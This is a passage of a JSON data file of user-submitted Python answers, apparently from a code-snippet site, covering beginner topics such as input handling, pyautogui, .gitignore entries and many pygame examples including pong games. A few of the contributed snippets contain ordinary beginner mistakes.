    "description": "# Python program to find the largest number among the three input numbers # take three numbers from user num1 = float(input(\"Enter first number: \")) num2 = float(input(\"Enter second number: \")) num3 = float(input(\"Enter third number: \"))  if (num1 > num2) and (num1 > num3):    largest = num1 elif (num2 > num1) and (num2 > num3):    largest = num2 else:    largest = num3  print(\"The largest number is\",largest) \n##Write a Python program to input 3 numbers and find the largest.  ##Print all the numbers, and the  largest among them, with appropriate titles.    n1=float(input(\"Enter number 1: \")) n2=float(input(\"Enter number 2: \")) n3=float(input(\"Enter number 3: \")) if n1 > n2 :  if n1 > n3 :      LNo=n1  else :      LNo=n3 else :  if n2 >n3 :      LNo=n2  else :      LNo=n3 print(\"DISPLAY........\") print(\"Number 1 : \",n1) print(\"Number 2 : \",n2) print(\"Number 3 : \",n3) print(\"Largest number is : \",LNo)  \n",
    "reg_date": "2021-10-12T11:32:33.000Z"
  },
  {
    "id": 2902,
    "keyword": null,
    "link": null,
    "title": " pros and cons of python flush print function",
    "description": "from time import sleep  # output is flushed here print(\"Hello, world!\", end='', flush= True) sleep(5) print(\"Bye!!!\") \n",
    "reg_date": "2021-10-12T11:32:33.000Z"
  },
  {
    "id": 2903,
    "keyword": null,
    "link": null,
    "title": " puissance python",
    "description": "Puissance de deux == ton chiffre**2\n",
    "reg_date": "2021-10-12T11:32:33.000Z"
  },
  {
    "id": 2904,
    "keyword": null,
    "link": null,
    "title": " put comma in numbers python",
    "description": "num = 2437.68  # Way 1: String Formatting  '{:,}'.format(num) >>> '2,437.68'   # Way 2: F-Strings  f'{num:,}' >>> '2,437.68'   # Way 3: Built-in Format Function  format(num, ',') >>> '2,437.68' \n>>> num = 10000000 >>> print(f\"{num:,}\") 10,000,000 \n",
    "reg_date": "2021-10-12T11:32:33.000Z"
  },
  {
    "id": 2905,
    "keyword": null,
    "link": null,
    "title": " put text on image python",
    "description": "from PIL import Image, ImageFont, ImageDraw  my_image = Image.open(\"image.jpg\")  title_font = ImageFont.truetype('font.ttf', 200)  image_editable = ImageDraw.Draw(my_image) image_editable.text((15,15), \"Text goes here\", (237, 230, 211), font=title_font)  my_image.save(\"image-text.jpg\")\n",
    "reg_date": "2021-10-12T11:32:33.000Z"
  },
  {
    "id": 2906,
    "keyword": null,
    "link": null,
    "title": " pwd python",
    "description": "import os cwd = os.getcwd()\nimport os os.getcwd() \n",
    "reg_date": "2021-10-12T11:32:34.000Z"
  },
  {
    "id": 2907,
    "keyword": null,
    "link": null,
    "title": " pyAudioAnalysis",
    "description": "pip install pyAudioAnalysis\n",
    "reg_date": "2021-10-12T11:32:34.000Z"
  },
  {
    "id": 2908,
    "keyword": null,
    "link": null,
    "title": " py change background",
    "description": "import ctypes ctypes.windll.user32.SystemParametersInfoW(20, 0, \"absolute path\" , 0)\n",
    "reg_date": "2021-10-12T11:32:34.000Z"
  },
  {
    "id": 2909,
    "keyword": null,
    "link": null,
    "title": " py get mouse coordinates",
    "description": "import pyautogui pos = pyautogui.position()\n",
    "reg_date": "2021-10-12T11:32:34.000Z"
  },
  {
    "id": 2910,
    "keyword": null,
    "link": null,
    "title": " py sleep function",
    "description": "import time  print(\"Print now\") time.sleep(4.2) print(\"Printing after 4.2 seconds\")\n",
    "reg_date": "2021-10-12T11:32:34.000Z"
  },
  {
    "id": 2911,
    "keyword": null,
    "link": null,
    "title": " pyaudio not installing ubuntu",
    "description": "sudo apt-get install portaudio19-dev python-pyaudio\n\"\"\" If you are having trouble installing PyAudio on your mechine, pyaudio is a unofficial library, so you need to use pipwin to install and use PyAudio and if you don't know anything about pipwin no problem you may  watch this video: https://www.youtube.com/watch?v=-3am_5jMzJ4 \"\"\"\n",
    "reg_date": "2021-10-12T11:32:34.000Z"
  },
  {
    "id": 2912,
    "keyword": null,
    "link": null,
    "title": " pyautogui install",
    "description": "pip3 install pyautogui\n    >>> import pyautogui     >>> screenWidth, screenHeight = pyautogui.size() # Returns two integers, the width and height of the screen. (The primary monitor, in multi-monitor setups.)     >>> currentMouseX, currentMouseY = pyautogui.position() # Returns two integers, the x and y of the mouse cursor's current position.     >>> pyautogui.moveTo(100, 150) # Move the mouse to the x, y coordinates 100, 150.     >>> pyautogui.click() # Click the mouse at its current location.     >>> pyautogui.click(200, 220) # Click the mouse at the x, y coordinates 200, 220.     >>> pyautogui.move(None, 10)  # Move mouse 10 pixels down, that is, move the mouse relative to its current position.     >>> pyautogui.doubleClick() # Double click the mouse at the     >>> pyautogui.moveTo(500, 500, duration=2, tween=pyautogui.easeInOutQuad) # Use tweening/easing function to move mouse over 2 seconds.     >>> pyautogui.write('Hello world!', interval=0.25)  # Type with quarter-second pause in between each key.     >>> pyautogui.press('esc') # Simulate pressing the Escape key.     >>> pyautogui.keyDown('shift')     >>> pyautogui.write(['left', 'left', 'left', 'left', 'left', 'left'])     >>> pyautogui.keyUp('shift')     >>> pyautogui.hotkey('ctrl', 'c') \n#type: py -m pip install pyautogui #in the terminal\npip3 install pyautogui  import pyautogui screenWidth, screenHeight = pyautogui.size() # Get the size of the primary monitor. currentMouseX, currentMouseY = pyautogui.position() # Get the XY position of the mouse. pyautogui.moveTo(100, 150) # Move the mouse to XY coordinates. pyautogui.moveTo(500, 500, duration=2, tween=pyautogui.easeInOutQuad)  # Use tweening/easing function to move mouse over 2 seconds. pyautogui.move(0, 10)      # Move mouse 10 pixels down from its current position.  pyautogui.click()          # Click the mouse. pyautogui.click(100, 200)  # Move the mouse to XY coordinates and click it. pyautogui.click('button.png') # Find where button.png appears on the screen and click it. pyautogui.doubleClick()    # Double click the mouse.  pyautogui.write('Hello world!', interval=0.25)  # type with quarter-second pause in between each key pyautogui.press('esc')     # Press the Esc key. All key names are in pyautogui.KEY_NAMES pyautogui.keyDown('shift') # Press the Shift key down and hold it. pyautogui.press(['left', 'left', 'left', 'left']) # Press the left arrow key 4 times. pyautogui.keyUp('shift')   # Let go of the Shift key. pyautogui.hotkey('ctrl', 'c') # Press the Ctrl-C hotkey combination.  pyautogui.alert('This is the message to display.') # Make an alert box appear and pause the program until OK is clicked.\npy -m pip install pyautogui  #thats for if you arnt in the same directory, witch mot of you arnt\n>>> import pyautogui  >>> screenWidth, screenHeight = pyautogui.size() # Get the size of the primary monitor. >>> screenWidth, screenHeight (2560, 1440)  >>> currentMouseX, currentMouseY = pyautogui.position() # Get the XY position of the mouse. >>> currentMouseX, currentMouseY (1314, 345)  >>> pyautogui.moveTo(100, 150) # Move the mouse to XY coordinates.  >>> pyautogui.click()          # Click the mouse. >>> pyautogui.click(100, 200)  # Move the mouse to XY coordinates and click it. >>> pyautogui.click('button.png') # Find where button.png appears on the screen and click it.  >>> pyautogui.move(400, 0)      # Move the mouse 400 pixels to the right of its current position. >>> pyautogui.doubleClick()     # Double click the mouse. >>> pyautogui.moveTo(500, 500, duration=2, tween=pyautogui.easeInOutQuad)  # Use tweening/easing function to move mouse over 2 seconds.  >>> pyautogui.write('Hello world!', interval=0.25)  # type with quarter-second pause in between each key >>> pyautogui.press('esc')     # Press the Esc key. All key names are in pyautogui.KEY_NAMES  >>> with pyautogui.hold('shift'):  # Press the Shift key down and hold it.         pyautogui.press(['left', 'left', 'left', 'left'])  # Press the left arrow key 4 times. >>> # Shift key is released automatically.  >>> pyautogui.hotkey('ctrl', 'c') # Press the Ctrl-C hotkey combination.  >>> pyautogui.alert('This is the message to display.') # Make an alert box appear and pause the program until OK is clicked. \n",
    "reg_date": "2021-10-12T11:32:34.000Z"
  },
  {
    "id": 2913,
    "keyword": null,
    "link": null,
    "title": " pycache in gitignore",
    "description": "# Byte-compiled / optimized / DLL files __pycache__/ *.py[cod] *$py.class  # C extensions *.so  # Distribution / packaging .Python build/ develop-eggs/ dist/ downloads/ eggs/ .eggs/ lib/ lib64/ parts/ sdist/ var/ wheels/ *.egg-info/ .installed.cfg *.egg MANIFEST  # PyInstaller #  Usually these files are written by a python script from a template #  before PyInstaller builds the exe, so as to inject date/other infos into it. *.manifest *.spec  # Installer logs pip-log.txt pip-delete-this-directory.txt  # Unit test / coverage reports htmlcov/ .tox/ .coverage .coverage.* .cache nosetests.xml coverage.xml *.cover .hypothesis/ .pytest_cache/  # Translations *.mo *.pot  # Django stuff: *.log local_settings.py db.sqlite3  # Flask stuff: instance/ .webassets-cache  # Scrapy stuff: .scrapy  # Sphinx documentation docs/_build/  # PyBuilder target/  # Jupyter Notebook .ipynb_checkpoints  # pyenv .python-version  # celery beat schedule file celerybeat-schedule  # SageMath parsed files *.sage.py  # Environments .env .venv env/ venv/ ENV/ env.bak/ venv.bak/  # Spyder project settings .spyderproject .spyproject  # Rope project settings .ropeproject  # mkdocs documentation /site  # mypy .mypy_cache/ \n",
    "reg_date": "2021-10-12T11:32:34.000Z"
  },
  {
    "id": 2914,
    "keyword": null,
    "link": null,
    "title": " pycharm",
    "description": "Great choice my dude\npycharm is a cross-platform python IDE\nᴍᴀʏ ᴛʜᴇ ꜰᴏʀᴄᴇ ʙᴇ ᴡɪᴛʜ ʏᴏᴜ\nWHY ?! VS CODE IS BETTER YOUNG MASTER\nVery Smart Choice. PyCharm is epic\nyou are a woman with a very good taste\nYou chose like a god\nJetbrain's IDEs are the best in the World.                                         - Hiren Vadher\nYup good choice PyCharm best Python IDE\nDefinitely the best IDE, way better than ghetto VS code\n",
    "reg_date": "2021-10-12T11:32:34.000Z"
  },
  {
    "id": 2915,
    "keyword": null,
    "link": null,
    "title": " pycharm Error: Please select a valid Python interpreter",
    "description": "Ensure that you have downloaded and installed Python on your computer.  Do one of the following:  Click the Python Interpreter selector and choose Add Interpreter.  Press Ctrl+Alt+S to open the project Settings/Preferences and go to Project <project name> | Python Interpreter. Then click the The Configure project interpreter icon and select Add.\n",
    "reg_date": "2021-10-12T11:32:34.000Z"
  },
  {
    "id": 2916,
    "keyword": null,
    "link": null,
    "title": " pycharm remove not in use imports",
    "description": "Just press Ctrl+Alt+O # remove all unused imports # remove only from the currently open file.\n",
    "reg_date": "2021-10-12T11:32:34.000Z"
  },
  {
    "id": 2917,
    "keyword": null,
    "link": null,
    "title": " pycharm why won't os work",
    "description": "import pygame import sys import os\n",
    "reg_date": "2021-10-12T11:32:34.000Z"
  },
  {
    "id": 2918,
    "keyword": null,
    "link": null,
    "title": " pydotprint",
    "description": "pip install pydot==1.2.3\n",
    "reg_date": "2021-10-12T11:32:35.000Z"
  },
  {
    "id": 2919,
    "keyword": null,
    "link": null,
    "title": " pygame.rect parameters",
    "description": "pygame.Rect(x, y, width, height)\n",
    "reg_date": "2021-10-12T11:32:35.000Z"
  },
  {
    "id": 2920,
    "keyword": null,
    "link": null,
    "title": " pygame.transform.scale",
    "description": "import pygame picture = pygame.image.load(filename) picture = pygame.transform.scale(picture, (1280, 720)) \npygame.transform.scale(Surface, (width, height), DestSurface = None)\nimport pygame import pygame.font  pygame.init() size = (400,400) screen = pygame.display.set_mode(size) clock = pygame.time.Clock()  def blitRotate(surf, image, pos, originPos, angle):      # calcaulate the axis aligned bounding box of the rotated image     w, h       = image.get_size()     box        = [pygame.math.Vector2(p) for p in [(0, 0), (w, 0), (w, -h), (0, -h)]]     box_rotate = [p.rotate(angle) for p in box]     min_box    = (min(box_rotate, key=lambda p: p[0])[0], min(box_rotate, key=lambda p: p[1])[1])     max_box    = (max(box_rotate, key=lambda p: p[0])[0], max(box_rotate, key=lambda p: p[1])[1])      # calculate the translation of the pivot      pivot        = pygame.math.Vector2(originPos[0], -originPos[1])     pivot_rotate = pivot.rotate(angle)     pivot_move   = pivot_rotate - pivot      # calculate the upper left origin of the rotated image     origin = (pos[0] - originPos[0] + min_box[0] - pivot_move[0], pos[1] - originPos[1] - max_box[1] + pivot_move[1])      # get a rotated image     rotated_image = pygame.transform.rotate(image, angle)      # rotate and blit the image     surf.blit(rotated_image, origin)      # draw rectangle around the image     pygame.draw.rect (surf, (255, 0, 0), (*origin, *rotated_image.get_size()),2)  font = pygame.font.SysFont('Times New Roman', 50) text = font.render('image', False, (255, 255, 0)) image = pygame.Surface((text.get_width()+1, text.get_height()+1)) pygame.draw.rect(image, (0, 0, 255), (1, 1, *text.get_size())) image.blit(text, (1, 1)) w, h = image.get_size()  angle = 0 done = False while not done:     clock.tick(60)     for event in pygame.event.get():         if event.type == pygame.QUIT:             done = True         elif event.type == pygame.KEYDOWN:             if event.key==pygame.K_ESCAPE:                 done = True      pos = (screen.get_width()//2, screen.get_height()//2)     pos = (200, 200)      screen.fill(0)     blitRotate(screen, image, pos, (w//2, h//2), angle)     angle += 1      pygame.draw.line(screen, (0, 255, 0), (pos[0]-20, pos[1]), (pos[0]+20, pos[1]), 3)     pygame.draw.line(screen, (0, 255, 0), (pos[0], pos[1]-20), (pos[0], pos[1]+20), 3)     pygame.draw.circle(screen, (0, 255, 0), pos, 7, 0)      pygame.display.flip()  pygame.quit() \n#Start Libraries import pygame, sys from pygame.locals import * #End Libraries  pygame.init() #We're initializing the script  pygame.display.set_caption('Platform') #This is the name of the window window_size = (600,400) #The size of the window screen = pygame.display.set_mode(window_size) #Initializing the screen  image_not_scaled = pygame.image.load('file_path.png').convert() #Importing the image image = pygame.transform.scale(image_not_scaled, (32, 32)) #You can insert whatever you want for example (64, 64) \t\t\t\t\t\t\t\t\t\t\t\t\t\t   #It MUST be a tuple  #Now we'll create the while loop run = True #With this we can control the script (stop it) while run: #For NOW itz a simple while true     screen.fill((255, 255, 255)) #Filling the screen with white     screen.blit(image, (0, 0)) #Blitting the image on the screen      for event in pygame.event.get(): #Checking the events         if event.type == QUIT: #Checking if the event is QUIT             pygame.quit() #In that case we'll exit from pygame             sys.exit() #In that case we'll exit from the script          pygame.display.update() #Updating the screen \nimport pygame  # Load picture picture = pygame.image.load(\"your/file/directery.png\") # choose a picture and spesefy directery  # Resize picture = pygame.transform.scale(picture # spesefy the objekt, (100, 100))# here is the scale by pixels\n",
    "reg_date": "2021-10-12T11:32:35.000Z"
  },
  {
    "id": 2921,
    "keyword": null,
    "link": null,
    "title": " pygame draw circle",
    "description": "window = pygame.display.set_mode(300, 300) colour = (0,0,255) #green circle_x_&_y = (150, 50) circle_radius = 12 border_width = 0 #0 = filled circle  pygame.draw.circle(window, colour, circle_x_&_y, circle_radius, border_width)\npygame.draw.line(surface, color, start_pos, end_pos, width)\ncircle(surface, color, center, radius)\n",
    "reg_date": "2021-10-12T11:32:35.000Z"
  },
  {
    "id": 2922,
    "keyword": null,
    "link": null,
    "title": " pygame example",
    "description": "import pygame pygame.init() back = (192,192,192) gameDisplay = pygame.display.set_mode((800,600)) pygame.display.set_caption('A bit Racey') gameDisplay.fill(back) clock = pygame.time.Clock() running = True while running:     for event in pygame.event.get():         if event.type == pygame.QUIT:             running = False     pygame.display.update()     clock.tick(60)    pygame.quit() quit()              \npython3 -m pip install pygame <<<(mac)>>> or python -m pip install pygame <<<(windows)>>> or sudo apt install python3-pygame <<<(ubuntu)>>>\n 1 # Simple pygame program  2   3 # Import and initialize the pygame library  4 import pygame  5 pygame.init()  6   7 # Set up the drawing window  8 screen = pygame.display.set_mode([500, 500])  9  10 # Run until the user asks to quit 11 running = True 12 while running: 13  14     # Did the user click the window close button? 15     for event in pygame.event.get(): 16         if event.type == pygame.QUIT: 17             running = False 18  19     # Fill the background with white 20     screen.fill((255, 255, 255)) 21  22     # Draw a solid blue circle in the center 23     pygame.draw.circle(screen, (0, 0, 255), (250, 250), 75) 24  25     # Flip the display 26     pygame.display.flip() 27  28 # Done! Time to quit. 29 pygame.quit() \n# Import and initialize the pygame library import pygame pygame.init()  # Set up the drawing window screen = pygame.display.set_mode([500, 500])  # Run until the user asks to quit running = True while running:       # Did the user click the window close button?      for event in pygame.event.get():          if event.type == pygame.QUIT:              running = False       # Fill the background with white      screen.fill((255, 255, 255))       # Draw a solid blue circle in the center      pygame.draw.circle(screen, (0, 0, 255), (250, 250), 75)       # Flip the display      pygame.display.flip()  # Time to end the Game pygame.quit() \n-m pygame.examples.astriodsmasher\n# Simple pygame code! import pygame  pygame.init() # intialize the library  # Set up the drawing window screen = pygame.display.set_mode([500, 500])  # Run until the user asks to quit running = True while running:     # Check if the user clicked the close button so that they dont keep playing for like     # 2 years     for event in pygame.event.get():         if event.type == pygame.QUIT:             running = False      # Fill the background with white (R, G, B) (also if you dont like lightmode, just replace it with (0,0,0))     screen.fill((255, 255, 255))      # Draw a blue circle in the center     pygame.draw.circle(screen, (0, 0, 255), (250, 250), 75)      # Flip the display     pygame.display.flip()  # Quit the program pygame.quit()\n",
    "reg_date": "2021-10-12T11:32:35.000Z"
  },
  {
    "id": 2923,
    "keyword": null,
    "link": null,
    "title": " pygame fonts",
    "description": "# On this version of windows 10 the pygame fonts available are listed below  arial arialblack bahnschrift calibri cambriacambriamath cambria candara comicsansms consolas constantia corbel couriernew ebrima franklingothicmedium gabriola gadugi georgia impact inkfree javanesetext leelawadeeui leelawadeeuisemilight lucidaconsole lucidasans malgungothic malgungothicsemilight microsofthimalaya microsoftjhengheimicrosoftjhengheiui microsoftjhengheimicrosoftjhengheiuibold microsoftjhengheimicrosoftjhengheiuilight microsoftnewtailue microsoftphagspa microsoftsansserif microsofttaile microsoftyaheimicrosoftyaheiui microsoftyaheimicrosoftyaheiuibold microsoftyaheimicrosoftyaheiuilight microsoftyibaiti mingliuextbpmingliuextbmingliuhkscsextb mongolianbaiti msgothicmsuigothicmspgothic mvboli myanmartext nirmalaui nirmalauisemilight palatinolinotype segoemdl2assets segoeprint segoescript segoeui segoeuiblack segoeuiemoji segoeuihistoric segoeuisemibold segoeuisemilight segoeuisymbol simsunnsimsun simsunextb sitkasmallsitkatextsitkasubheadingsitkaheadingsitkadisplaysitkabanner sitkasmallsitkatextboldsitkasubheadingboldsitkaheadingboldsitkadisplayboldsitkabannerbold sitkasmallsitkatextbolditalicsitkasubheadingbolditalicsitkaheadingbolditalicsitkadisplaybolditalicsitkabannerbolditalic sitkasmallsitkatextitalicsitkasubheadingitalicsitkaheadingitalicsitkadisplayitalicsitkabanneritalic sylfaen symbol tahoma timesnewroman trebuchetms verdana webdings wingdings yugothicyugothicuisemiboldyugothicuibold yugothicyugothicuilight yugothicmediumyugothicuiregular yugothicregularyugothicuisemilight holomdl2assets bookantiqua bookmanoldstyle bookshelfsymbol7 century dubai dubaimedium dubairegular garamond centurygothic leelawadee microsoftuighur monotypecorsiva extra msreferencesansserif msreferencespecialty wingdings2 wingdings3\n\"\"\"system font\"\"\" font = pygame.font.SysFont(\"Segoe UI\", 35)  \"\"\"font from .ttf file\"\"\" font = pygame.font.Font(\"path/to/font.ttf\", 35)  textsurface = font.render(\"text\", False, color)  # \"text\", antialias, color surface.blit(textsurface, (x, y))\nfont = pygame.font.SysFont(None, 24) img = font.render('hello', True, BLUE) screen.blit(img, (20, 20))\n",
    "reg_date": "2021-10-12T11:32:35.000Z"
  },
  {
    "id": 2924,
    "keyword": null,
    "link": null,
    "title": " pygame get if button is released",
    "description": "for event in pygame.event.get() :   if event.type == pygame.KEYDOWN :     if event.key == pygame.K_SPACE :       print \"Space bar pressed down.\"\n",
    "reg_date": "2021-10-12T11:32:35.000Z"
  },
  {
    "id": 2925,
    "keyword": null,
    "link": null,
    "title": " pygame get mouse position",
    "description": "x,y = pygame.mouse.get_pos() #get the mouse cursor position #get_pos() -> (x, y) #Returns the X and Y position of the mouse cursor. #The position is relative to the top-left corner of the display. #The cursor position can be located outside of the display window, #but is always constrained to the screen.\n pygame.mouse.get_pos()     get the mouse cursor position     get_pos() -> (x, y)      Returns the x and y position of the mouse cursor.      The position is relative to the top-left corner of the display.      The cursor position can be located outside of the display window,     but is always constrained to the screen.\n",
    "reg_date": "2021-10-12T11:32:35.000Z"
  },
  {
    "id": 2926,
    "keyword": null,
    "link": null,
    "title": " pygame get screen width and height",
    "description": "#pygame w, h = pygame.display.get_surface().get_size()  #w = width #h = height\n",
    "reg_date": "2021-10-12T11:32:35.000Z"
  },
  {
    "id": 2927,
    "keyword": null,
    "link": null,
    "title": " pygame how to make a transparent surface",
    "description": "#Creates an empty per-pixel alpha Surface #surface_name = pygame.Surface((x, y), pygame.SRCALPHA) my_surface = pygame.Surface((500, 500), pygame.SRCALPHA)\n",
    "reg_date": "2021-10-12T11:32:36.000Z"
  },
  {
    "id": 2928,
    "keyword": null,
    "link": null,
    "title": " pygame install",
    "description": "python3 -m pip install pygame <<<(mac)>>> or python -m pip install pygame <<<(windows)>>> or sudo apt install python3-pygame <<<(ubuntu)>>>\n# on your terminal :  pip install pygame   # check if pygame run :  py -m pygame.examples.aliens  # if a window is open -> pygame is correctly installed \npip install pygame\ntry: pip install pygame else: pip3 install pygame else: python -m pip install pygame else: python3 -m pip install pygame else: py -m pip install pygame(this is my method) (this is only for windows)\nfor windows users:  press windows+r type cmd  type py -m pip install pygame\nimport pygame pygame.init()  win = pygame.display.set_mode((500,500)) pygame.display.set_caption(\"First Game\")  x = 50 y = 50 width = 40 height = 60 vel = 5  run = True  while run:     pygame.time.delay(100) # This will delay the game the given amount of milliseconds. In our casee 0.1 seconds will be the delay      for event in pygame.event.get():  # This will loop through a list of any keyboard or mouse events.         if event.type == pygame.QUIT: # Checks if the red button in the corner of the window is clicked             run = False  # Ends the game loop  pygame.quit()  # If we exit the loop this will execute and close our game     \n",
    "reg_date": "2021-10-12T11:32:36.000Z"
  },
  {
    "id": 2929,
    "keyword": null,
    "link": null,
    "title": " pygame key pressed once",
    "description": "import pygame events = pygame.event.get() for event in events:     if event.type == pygame.KEYDOWN:         if event.key == pygame.K_LEFT:             location -= 1         if event.key == pygame.K_RIGHT:             location += 1 \n# Outside loop pressed = False  # Inside loop if event.type == pygame.KEYDOWN: \tif event.key == pygame.K_a and not pressed: #K_a can be replaced by any key \t\t# Do something \t\tpressed = True \telif event.key != pygame.K_a:     \tpressed = False\n",
    "reg_date": "2021-10-12T11:32:36.000Z"
  },
  {
    "id": 2930,
    "keyword": null,
    "link": null,
    "title": " pygame play sound",
    "description": "import pygame  pygame.mixer.init() crash_sound = pygame.mixer.Sound(\"crash.wav\") crash_sound.play()\n#has to be in .mp3 format #has to be in same folder #load the music pygame.mixer.music.load('song.mp3') #play the music infinite pygame.mixer.music.play(-1) #or play it one time pygame.mixer.music.play(0)\n",
    "reg_date": "2021-10-12T11:32:36.000Z"
  },
  {
    "id": 2931,
    "keyword": null,
    "link": null,
    "title": " pygame pong",
    "description": "#The best python pong game without pygame!  import turtle  a_wins = False b_wins = False  # Set up the screen turtle.Screen() wn = turtle.Screen() wn.title(\"Ping Pong game by Timothy\") wn.bgcolor(\"black\") wn.setup(width=800, height=600) wn.tracer(0)  # Score score_a = 0 score_b = 0 score_lim = 10 switch = True  # Paddle A paddle_a = turtle.Turtle() paddle_a.speed(0) paddle_a.color(\"white\") paddle_a.shape(\"square\") paddle_a.penup() paddle_a.goto(-350, 0) paddle_a.shapesize(stretch_wid=5, stretch_len=1)  # Paddle B paddle_b = turtle.Turtle() paddle_b.speed(0) paddle_b.color(\"white\") paddle_b.shape(\"square\") paddle_b.penup() paddle_b.goto(350, 0) paddle_b.shapesize(stretch_wid=5, stretch_len=1)  paddle_a_speed = 20 paddle_b_speed = 20  # Ball ball = turtle.Turtle() ball.speed(0) ball.shape(\"circle\") ball.color(\"white\") ball.penup() ball.goto(0, 0) ball.dy = 0.4 ball.dx = 0.4  # Pen pen = turtle.Turtle() pen.speed(0) pen.penup() pen.color(\"white\") pen.hideturtle() pen.goto(0, 260) pen.write(\"Player A: 0  Player B: 0\", align=\"center\", font=(\"Courier\", 24, \"normal\"))  # Win win = turtle.Turtle() win.speed(0) win.penup() win.color(\"white\") win.hideturtle() win.goto(0, 0)   # Function def paddle_a_up():     y = paddle_a.ycor()     y += paddle_a_speed     paddle_a.sety(y)   def paddle_a_down():     y = paddle_a.ycor()     y -= paddle_a_speed     paddle_a.sety(y)   def paddle_b_up():     y = paddle_b.ycor()     y += paddle_b_speed     paddle_b.sety(y)   def paddle_b_down():     y = paddle_b.ycor()     y -= paddle_b_speed     paddle_b.sety(y)   turtle.listen() turtle.onkey(paddle_a_up, \"w\") turtle.onkey(paddle_a_down, \"s\") turtle.onkey(paddle_b_up, \"Up\") turtle.onkey(paddle_b_down, \"Down\")  # Main game loop while True:     wn.update()      # Move the ball     ball.setx(ball.xcor() + ball.dx)     ball.sety(ball.ycor() + ball.dy)      # Border     if ball.ycor() > 290:         ball.sety(290)         ball.dy *= -1     elif ball.ycor() < -290:         ball.sety(-290)         ball.dy *= -1     elif ball.xcor() > 390:         ball.goto(0, 0)         ball.dx *= -1         score_a += 1     elif ball.xcor() < -390:         ball.goto(0, 0)         ball.dx *= -1         score_b += 1      # Paddle     if 340 < ball.xcor() < 350 and paddle_b.ycor() + 40 > ball.ycor() > paddle_b.ycor() - 40:         ball.setx(340)         ball.dx *= -1     if -340 > ball.xcor() > -350 and paddle_a.ycor() + 40 > ball.ycor() > paddle_a.ycor() - 40:         ball.setx(-340)         ball.dx *= -1      pen.clear()     pen.write(f\"Player A: {score_a}  Player B: {score_b}\", align=\"center\", font=(\"Courier\", 24, \"normal\"))      if score_a == score_lim:         turtle.clearscreen()         a_wins = True         break      elif score_b == score_lim:         turtle.clearscreen()         b_wins = True         break   while True:     if a_wins:         wn.bgcolor(\"black\")         win.write(\"Player A wins\", align=\"center\", font=(\"Courier\", 50, \"normal\"))     elif b_wins:         wn.bgcolor(\"black\")         win.write(\"Player B wins\", align=\"center\", font=(\"Courier\", 50, \"normal\"))\nimport pygame  ### Colors WHITE = (255, 255, 255) BLACK = (0,0,0)  ### Constants W = 600 H = 600 pygame.font.init() comic = pygame.font.SysFont('Comic Sans MS', 30)  ### Variables wt = 10 mplay = False  p1x = W/30 p1y = H/2 - ((W/60)**2)/2  p2x = W-(W/30) p2y = H/2 - ((W/60)**2)/2  p1score = 0 p2score = 0  w_p = False s_p = False wsr = False u_p = False d_p = False udr = False  dm = H/40  paddle_width = W/60 paddle_height = paddle_width**2  bsd = 1  bx = W/2 by = H/2 bw = W/65 bxv = H/60 bxv = -bxv byv = 0  ### Functions def drawpaddle(x, y, w, h):     pygame.draw.rect(screen, WHITE, (x, y, w, h))  def drawball(x, y):     pygame.draw.circle(screen, WHITE, (int(x), int(y)), int(bw))  def uploc():     global p1y     global p2y     if w_p:         if p1y-(dm) < 0:             py1 = 0         else:             p1y -= dm     elif s_p:         if p1y+(dm)+paddle_height > H:             p1y = H-paddle_height         else:             p1y += dm     if u_p:         if p2y-(dm) < 0:             p2y = 0         else:             p2y -= dm     elif d_p:         if p2y+(dm)+paddle_height > H:             p2y = H-paddle_height         else:             p2y += dm  def upblnv():     global bx     global bxv     global by     global byv     global p2score     global p1score      if (bx+bxv < p1x+paddle_width) and ((p1y < by+byv+bw) and (by+byv-bw < p1y+paddle_height)):         bxv = -bxv         byv = ((p1y+(p1y+paddle_height))/2)-by         byv = -byv/((5*bw)/7)     elif bx+bxv < 0:         p2score += 1         bx = W/2         bxv = H/60         by = H/2         byv = 0     if (bx+bxv > p2x) and ((p2y < by+byv+bw) and (by+byv-bw < p2y+paddle_height)):         bxv = -bxv         byv = ((p2y+(p2y+paddle_height))/2)-by         byv = -byv/((5*bw)/7)     elif bx+bxv > W:         p1score += 1         bx = W/2         bxv = -H/60         by = H/2         byv = 0     if by+byv > H or by+byv < 0:         byv = -byv      bx += bxv     by += byv  def drawscore():     score = comic.render(str(p1score) + \" - \" + str(p2score), False, WHITE)     screen.blit(score, (W/2,30))  ### Initialize screen = pygame.display.set_mode((W, H)) pygame.display.set_caption('Snake ML v.1.0.0') screen.fill(BLACK) pygame.display.flip()  running = True while running:     for event in pygame.event.get():         if event.type == pygame.QUIT:             running = False         if event.type == pygame.KEYDOWN:             if event.key == pygame.K_ESCAPE:                 running = False             if event.key == pygame.K_w:                 w_p = True                 if s_p == True:                     s_p = False                     wsr = True             if event.key == pygame.K_s:                 s_p = True                 if w_p == True:                     w_p = False                     wsr = True             if event.key == pygame.K_UP:                 u_p = True                 if d_p == True:                     d_p = False                     udr = True             if event.key == pygame.K_DOWN:                 d_p = True                 if u_p == True:                     u_p = False                     udr = True         if event.type == pygame.KEYUP:             if event.key == pygame.K_w:                 w_p = False                 if wsr == True:                     s_p = True                     wsr = False             if event.key == pygame.K_s:                 s_p = False                 if wsr == True:                     w_p = True                     wsr = False             if event.key == pygame.K_UP:                 u_p = False                 if udr == True:                     d_p = True                     udr = False             if event.key == pygame.K_DOWN:                 d_p = False                 if udr == True:                     u_p = True                     udr = False      screen.fill(BLACK)     uploc()     upblnv()     drawscore()     drawball(bx, by)     drawpaddle(p1x, p1y, paddle_width, paddle_height)     drawpaddle(p2x, p2y, paddle_width, paddle_height)     pygame.display.flip()     pygame.time.wait(wt)\n",
    "reg_date": "2021-10-12T11:32:36.000Z"
  },
  {
    "id": 2932,
    "keyword": null,
    "link": null,
    "title": " pygame quit",
    "description": "running = True while running:   for event in pygame.event.get():     if event.type == pygame.QUIT:       running = False     if running == False:       pygame.quit()\nfor event in pygame.event.get():   if event.type == pygame.QUIT:     pygame.quit()\nrunning = Truewhile running:  for event in pygame.event.get():    if event.type == pygame.QUIT:      running = False\n",
    "reg_date": "2021-10-12T11:32:36.000Z"
  },
  {
    "id": 2933,
    "keyword": null,
    "link": null,
    "title": " pygame render text",
